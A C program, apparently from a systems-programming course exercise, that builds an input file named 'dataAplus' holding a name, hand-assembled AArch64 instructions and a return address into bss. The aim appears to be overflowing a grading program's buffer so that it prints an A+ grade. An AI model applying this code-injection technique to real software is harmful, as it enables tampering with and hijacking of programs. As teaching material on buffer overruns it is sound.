#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


int main(void){
   int i;
   unsigned long ulData;
   FILE *psFile;
   unsigned int adr1;
   unsigned int adr2;
   unsigned int mov1;
   unsigned int mov2;
   unsigned int strb1;
   unsigned int strb2;
   unsigned int b;
   unsigned int bl;
   /* Start of instructions in bss*/
   ulData = 0x420064;
   /* x0, [sp, grade] */
   adr1 = MiniAssembler_adr(0, 0x420044, 0x420064);
   /* mov  */
   mov1 = MiniAssembler_mov(1, 0x00000041);
   /* strb w1, [x0] */
   strb1 = MiniAssembler_strb(1, 0);
   /* bl puts */
   bl = MiniAssembler_bl(0x400600, 0x420070);
   /* adr x0, [sp, grade] */
   adr2 = MiniAssembler_adr(0, 0x420044, 0x420074);
   /*  */
   mov2 = MiniAssembler_mov(1, 0x0000002B);
   /* strb w1, [x0] */
   strb2 = MiniAssembler_strb(1, 0);
   /* b printf */
   b = MiniAssembler_b(0x400864, 0x420080);

   psFile = fopen("dataAplus", "w");

   fprintf(psFile,"Chris Ronda");

   putc('\0', psFile);

   /*fwrite(&mov1, sizeof(unsigned int), 1, psFile);*/
   fwrite(&adr1, sizeof(unsigned int), 1, psFile);
   fwrite(&mov1, sizeof(unsigned int), 1, psFile);
   fwrite(&strb1, sizeof(unsigned int), 1, psFile);
   fwrite(&bl, sizeof(unsigned int), 1, psFile);
   fwrite(&adr2, sizeof(unsigned int), 1, psFile);
   fwrite(&mov2, sizeof(unsigned int), 1, psFile);
   fwrite(&strb2, sizeof(unsigned int), 1, psFile);
   fwrite(&b, sizeof(unsigned int), 1, psFile);

   for(i = 0; i < 4; i++){
      putc('\0', psFile);
   }

   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   fclose(psFile);

   return 0;
}
 
